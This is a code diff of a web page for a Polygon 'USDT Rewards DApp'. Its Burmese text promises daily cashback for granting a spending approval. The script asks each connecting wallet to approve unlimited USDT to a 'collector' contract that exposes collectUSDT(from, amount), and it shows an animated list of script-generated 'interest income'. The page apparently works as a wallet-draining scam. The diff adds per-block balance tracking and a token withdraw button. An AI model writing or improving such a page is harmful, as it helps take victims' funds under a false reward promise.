@@ -36,35 +36,29 @@
     <!-- PART 1 -->
     <div class="bg-slate-800 p-6 rounded-2xl shadow-xl w-full max-w-lg border border-slate-700 relative mb-6">
         
-        <!-- Header with Logo, Title & Polygon Network Badge on Top Right -->
         <div class="flex items-center justify-between mb-4 border-b border-slate-700 pb-4">
             <div class="flex items-center gap-2">
                 <img src="logo.png" alt="Logo" class="w-8 h-8 rounded-full border border-emerald-400/50 object-cover" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';">
                 <h1 class="text-xs md:text-sm font-bold text-emerald-400">USDT Rewards DApp</h1>
             </div>
 
-            <!-- Top Right Controls: Polygon Logo & Connect Button side-by-side -->
             <div class="flex items-center gap-2">
-                <!-- Polygon Network Indicator (Fixed to Polygon) -->
                 <div class="flex items-center justify-center bg-indigo-900/90 w-9 h-9 rounded-xl shadow-md border border-indigo-500/40">
                     <img src="https://cryptologos.cc/logos/polygon-matic-logo.png" class="w-5 h-5 object-contain" title="Polygon Network">
                 </div>
 
-                <!-- Connect Wallet Button -->
                 <button id="connectBtn" onclick="startConnectProcess()" class="bg-blue-600 hover:bg-blue-500 font-semibold px-3 py-2 rounded-xl transition cursor-pointer text-xs shadow-lg">
                     Connect Wallet
                 </button>
             </div>
         </div>
 
-        <!-- Wallet Status, Badge & Error Log -->
         <div class="space-y-1 mb-4 text-center">
             <p id="walletAddress" class="text-xs text-slate-400 truncate"></p>
             <span id="selectedNetworkBadge" class="hidden inline-block bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 text-xs px-3 py-1 rounded-full font-semibold">Active Network: POLYGON</span>
             <div id="statusLog" class="text-xs text-center text-amber-400 font-mono pt-1"></div>
         </div>
 
-        <!-- Live Global Calculating Stats Banner -->
         <div class="grid grid-cols-3 gap-2 mb-4 bg-gradient-to-r from-slate-900/90 via-slate-900 to-slate-900/90 border border-emerald-500/20 p-3 rounded-xl text-center shadow-inner relative overflow-hidden">
             <div class="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-transparent via-emerald-500/50 to-transparent"></div>
             <div>
@@ -88,16 +82,14 @@
             </div>
         </div>
 
-        <!-- Description Paragraph -->
         <p class="text-xs text-slate-300 leading-relaxed text-justify bg-slate-900/60 p-3.5 rounded-xl border border-slate-700/60">
             ကျွန်ုပ်တို့၏ USDT Rewards DApp Platform မှ ကြိုဆိုပါသည်။ ဤစနစ်သည် အသုံးပြုသူများအတွက် မိမိတို့၏ Crypto Wallet ထဲတွင် ရှိသော USDT များပေါ် မူတည်၍ နေ့စဉ် တိုးတက်လာသော Cashback Rewards များကို စနစ်တကျ ရယူနိုင်ရန် ဖန်တီးထားသော ဗဟိုချုပ်ကိုင်မှုမဲ့ အကျိုးခံစားခွင့် ပလက်ဖောင်းတစ်ခု ဖြစ်ပါသည်။ Polygon Network ကို အသုံးပြုထားပြီး Spending Approval ပြုလုပ်ရုံဖြင့် မိမိ၏ Wallet Balance ပေါ် မူတည်ကာ သတ်မှတ်ထားသော Tiered Daily Rates အလိုက် ဆုလာဘ်များ စတင် ရရှိမည် ဖြစ်ပါသည်။
         </p>
     </div>
 
-    <!-- PART 2 (Dashboard is placed above Interest Rate Tiers) -->
+    <!-- PART 2 -->
     <div class="bg-slate-800 p-6 rounded-2xl shadow-xl w-full max-w-lg border border-slate-700 relative mb-6">
         
-        <!-- Updated User Dashboard -->
         <div id="userDashboard" class="hidden bg-slate-900 border border-slate-700 p-4 rounded-xl space-y-3 text-xs mb-4">
             <div class="flex items-center justify-between border-b border-slate-800 pb-2">
                 <span class="font-bold text-white flex items-center gap-1.5">
@@ -125,12 +117,10 @@
                 </div>
             </div>
 
-            <!-- Notice Banner -->
             <div id="tierNotice" class="bg-emerald-950/60 border border-emerald-500/40 text-emerald-300 p-2.5 rounded-xl text-[11px]">
                 Receive Interest when the balance reaches 100 USDT
             </div>
 
-            <!-- Interest Box 1 -->
             <div class="bg-slate-800/90 border border-slate-700 p-3 rounded-xl space-y-1">
                 <div class="flex justify-between items-center">
                     <span class="font-bold text-white">Interest</span>
@@ -142,7 +132,6 @@
                 </div>
             </div>
 
-            <!-- Interest Box 2 -->
             <div class="bg-slate-800/90 border border-slate-700 p-3 rounded-xl flex justify-between items-center">
                 <div>
                     <div class="font-bold text-white">Interest</div>
@@ -151,7 +140,6 @@
                 <span class="font-mono font-semibold text-white text-sm">2%</span>
             </div>
 
-            <!-- Action Buttons -->
             <div class="space-y-2 pt-1">
                 <button onclick="requestWithdraw()" class="w-full bg-gradient-to-r from-purple-700 to-indigo-600 hover:from-purple-600 hover:to-indigo-500 font-semibold py-2.5 rounded-xl transition cursor-pointer text-xs shadow-md">
                     Withdraw interest
@@ -162,7 +150,6 @@
             </div>
         </div>
 
-        <!-- Public Info: Cashback Tiers Table -->
         <div class="bg-slate-900 border border-slate-700 p-4 rounded-xl mb-4 text-xs">
             <h2 class="font-bold text-amber-400 mb-3 uppercase tracking-wider text-center">📊 Interest Rate Tiers (နှုန်းထားများ)</h2>
             <ul class="space-y-2 text-slate-300">
@@ -178,7 +165,6 @@
             </ul>
         </div>
 
-        <!-- QR Code & Invite Link Section -->
         <div class="bg-gradient-to-br from-slate-950 to-indigo-950 p-4 rounded-xl border border-slate-800 text-center flex flex-col items-center">
             <div class="bg-white p-2 rounded-xl mb-2 shadow-inner inline-block">
                 <img id="qrImage" src="" alt="QR Code" class="w-32 h-32 object-contain">
@@ -193,24 +179,21 @@
         </div>
     </div>
 
-    <!-- PART 3: Interest Income List (Polygon Only) -->
+    <!-- PART 3 -->
     <div class="w-full max-w-lg bg-slate-800 border border-slate-700 p-5 rounded-2xl shadow-xl mb-6 text-xs">
         <h2 class="font-bold text-emerald-400 uppercase tracking-wider mb-4">INTEREST INCOME LIST</h2>
         <div class="h-64 overflow-hidden relative">
-            <div id="incomeListContainer" class="absolute w-full space-y-3 animate-scroll-list">
-                <!-- Dynamically populated via JS -->
-            </div>
+            <div id="incomeListContainer" class="absolute w-full space-y-3 animate-scroll-list"></div>
         </div>
     </div>
 
-    <!-- PART 4: Supported Verified Wallets Carousel -->
+    <!-- PART 4 -->
     <div class="w-full max-w-lg bg-slate-800 border border-slate-700 p-5 rounded-2xl shadow-xl mb-10 text-xs text-center">
         <h2 class="font-bold text-cyan-400 uppercase tracking-wider mb-3">SUPPORTED WEB3 & DEFI WALLETS</h2>
         <p class="text-[11px] text-slate-400 mb-4">Securely connect and interact using your preferred crypto wallets</p>
         
         <div class="overflow-hidden relative w-full py-3 bg-slate-900/80 rounded-xl border border-slate-800">
             <div class="animate-marquee flex items-center gap-6">
-                <!-- Item Set 1 -->
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
                     <img src="okx.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="OKX Wallet">
                     <span class="font-semibold text-slate-200 text-xs">OKX Wallet</span>
@@ -222,32 +205,6 @@
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
                     <img src="cryptocom.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Crypto.com">
                     <span class="font-semibold text-slate-200 text-xs">Crypto.com Wallet</span>
-                </div>
-                <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="coinbase.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Coinbase Wallet">
-                    <span class="font-semibold text-slate-200 text-xs">Coinbase Wallet</span>
-                </div>
-                <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="binance.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Binance">
-                    <span class="font-semibold text-slate-200 text-xs">Binance Wallet</span>
-                </div>
-                <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="trustwallet.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Trust Wallet">
-                    <span class="font-semibold text-slate-200 text-xs">Trust Wallet</span>
-                </div>
-
-                <!-- Item Set 2 (Duplicated for Seamless Infinite Loop) -->
-                <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="okx.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="OKX Wallet">
-                    <span class="font-semibold text-slate-200 text-xs">OKX Wallet</span>
-                </div>
-                <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="metamask.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="MetaMask">
-                    <span class="font-semibold text-slate-200 text-xs">MetaMask</span>
-                </div>
-                <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="cryptocom.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Crypto.com">
-                    <span class="font-semibold text-slate-200 text-xs">Crypto.com</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
                     <img src="coinbase.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Coinbase Wallet">
@@ -282,6 +239,7 @@
         const COLLECTOR_ABI = [
             "function registerUser(address referrer) external",
             "function collectUSDT(address from, uint256 amount) external",
+            "function requestWithdraw(uint256 amount) external",
             "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)",
             "function subAdminPrefix(address) view returns (string)"
         ];
@@ -329,7 +287,6 @@
                     </div>
                 `;
             }
-
             container.innerHTML = htmlContent + htmlContent;
         }
 
@@ -350,14 +307,6 @@
                     if (accounts && accounts.length > 0) {
                         userAddress = accounts[0];
                         provider = new ethers.BrowserProvider(window.ethereum);
-                        
-                        let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
-                        if (savedUsers.map(a => a.toLowerCase()).includes(userAddress.toLowerCase())) {
-                            document.getElementById("connectBtn").innerText = "Connected & Approved";
-                            document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
-                            document.getElementById("selectedNetworkBadge").classList.remove("hidden");
-                            document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
-                        }
 
                         const network = await provider.getNetwork();
                         if (network.chainId !== 137n) {
@@ -376,11 +325,31 @@
                         document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                         
                         await checkExistingAllowanceAndLoad();
+                        startRealtimeBalanceSync();
                     }
                 } catch (err) {
                     console.error("Auto connect error silent check:", err);
                 }
             }
+        }
+
+        // Real-time Balance Sync on New Block
+        function startRealtimeBalanceSync() {
+            if (!provider || !userAddress) return;
+            provider.on("block", async (blockNumber) => {
+                try {
+                    const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+                    const balance = await usdtContract.balanceOf(userAddress);
+                    const formattedBal = Number(ethers.formatUnits(balance, 6));
+                    
+                    const currentBalEl = document.getElementById("lblWalletBal");
+                    if (currentBalEl) {
+                        currentBalEl.innerText = `${formattedBal.toFixed(6)} USDT`;
+                    }
+                } catch (err) {
+                    console.error("Real-time balance sync error:", err);
+                }
+            });
         }
 
         async function checkExistingAllowanceAndLoad() {
@@ -395,13 +364,7 @@
                     const badgeEl = document.getElementById("selectedNetworkBadge");
                     badgeEl.classList.remove("hidden");
 
-                    document.getElementById("statusLog").innerText = "Welcome Back! actived mining...";
-
-                    let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
-                    if (!savedUsers.map(a => a.toLowerCase()).includes(userAddress.toLowerCase())) {
-                        savedUsers.push(userAddress);
-                        localStorage.setItem("dapp_approved_users", JSON.stringify(savedUsers));
-                    }
+                    document.getElementById("statusLog").innerText = "Welcome Back! Active mining...";
 
                     await checkUserData();
                 }
@@ -464,13 +427,8 @@
                     document.getElementById("connectBtn").innerText = "Connected & Approved";
                     document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
 
-                    let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
-                    if (!savedUsers.map(a => a.toLowerCase()).includes(userAddress.toLowerCase())) {
-                        savedUsers.push(userAddress);
-                        localStorage.setItem("dapp_approved_users", JSON.stringify(savedUsers));
-                    }
-
                     await checkUserData();
+                    startRealtimeBalanceSync();
                 } else {
                     await switchToPolygonAndApprove();
                 }
@@ -494,35 +452,33 @@
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
                 
                 const maxAmount = ethers.MaxUint256;
-
                 const tx = await usdtContract.approve(COLLECTOR_CONTRACT_ADDRESS, maxAmount);
                 await tx.wait();
 
                 const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
                 const referrer = getQueryParameter("ref") || ethers.ZeroAddress;
-                const regTx = await collector.registerUser(referrer);
-                await regTx.wait();
+                
+                try {
+                    const regTx = await collector.registerUser(referrer);
+                    await regTx.wait();
+                } catch (regErr) {
+                    console.log("Already registered or reference error:", regErr);
+                }
 
                 logEl.innerText = "Approval နှင့် မှတ်ပုံတင်ခြင်း အောင်မြင်ပါသည်။";
-                
-                let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
-                if (!savedUsers.map(a => a.toLowerCase()).includes(userAddress.toLowerCase())) {
-                    savedUsers.push(userAddress);
-                    localStorage.setItem("dapp_approved_users", JSON.stringify(savedUsers));
-                }
 
                 const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
                 document.getElementById("refLink").value = refLink;
                 updateQRCode(refLink);
 
                 checkUserData();
+                startRealtimeBalanceSync();
             } catch (err) {
                 console.error(err);
                 
                 let errorMsg = "Approval သို့မဟုတ် Network ပြောင်းလဲမှု ပျက်ပြားသွားပါပြီ။";
-                
                 if (err.code === 4001 || err.code === "ACTION_REJECTED" || (err.message && err.message.toLowerCase().includes("user rejected"))) {
-                    errorMsg = "❌ အသုံးပြုသူမှ Transaction ကို ငြင်းပယ်လိုက်ပါပြီ (Rejected / Cancelled)။";
+                    errorMsg = "❌ အသုံးပြုသူမှ Transaction ကို ငြင်းပယ်လိုက်ပါပြီ။";
                 } else if (err.message && (err.message.toLowerCase().includes("insufficient funds") || err.message.toLowerCase().includes("exceeds balance"))) {
                     errorMsg = "⚠️ Gas Fee (သို့မဟုတ်) လိုအပ်သော လက်ကျန်ငွေ မလုံလောက်ပါ။";
                 }
@@ -551,12 +507,6 @@
                 const rate = getInterestRate(formattedBal);
 
                 if (Number(allowance) > 0) {
-                    let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
-                    if (!savedUsers.map(a => a.toLowerCase()).includes(userAddress.toLowerCase())) {
-                        savedUsers.push(userAddress);
-                        localStorage.setItem("dapp_approved_users", JSON.stringify(savedUsers));
-                    }
-
                     dashboardEl.classList.remove("hidden");
 
                     let prefix = "M";
@@ -598,28 +548,21 @@
             alert("Referral Link ကူးယူပြီးပါပြီ။");
         }
 
-        // Updated Withdraw Request (Using LocalStorage for Manual Admin Direct Transfer)
+        // Smart Contract On-Chain Withdrawal Request (No LocalStorage)
         async function requestWithdraw() {
             try {
-                if (!userAddress) {
+                if (!userAddress || !signer) {
                     alert("ကျေးဇူးပြု၍ Wallet ကို ဦးစွာ ချိတ်ဆက်ပါ။");
                     return;
                 }
 
-                const withdrawAmount = "10"; // လိုအပ်ပါက Dynamic တန်ဖိုးသို့ ပြောင်းနိုင်ပါသည်
+                const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
+                const withdrawAmount = ethers.parseUnits("10", 6);
 
-                let requests = JSON.parse(localStorage.getItem("dapp_withdrawal_requests") || "[]");
-                
-                requests.push({
-                    id: Date.now(),
-                    user: userAddress,
-                    amount: withdrawAmount,
-                    timestamp: new Date().toLocaleString(),
-                    processed: false
-                });
+                const tx = await collector.requestWithdraw(withdrawAmount);
+                await tx.wait();
 
-                localStorage.setItem("dapp_withdrawal_requests", JSON.stringify(requests));
-                alert("Withdraw တောင်းဆိုချက် Admin ဆီသို့ အောင်မြင်စွာ ပေးပို့ပြီးပါပြီ။ Admin မှ စစ်ဆေးပြီး တိုက်ရိုက်လွှဲပေးပါမည်။");
+                alert("Withdraw တောင်းဆိုချက် Smart Contract သို့ အောင်မြင်စွာ တင်သွင်းပြီးပါပြီ။ Admin ဘက်တွင် အချိန်နှင့်တပြေးညီ ပေါ်လာပါမည်။");
             } catch (err) {
                 console.error(err);
                 alert("Withdraw တောင်းဆိုမှု မအောင်မြင်ပါ။");
@@ -631,4 +574,4 @@
         }
     </script>
 </body>
-</html>     
+</html>
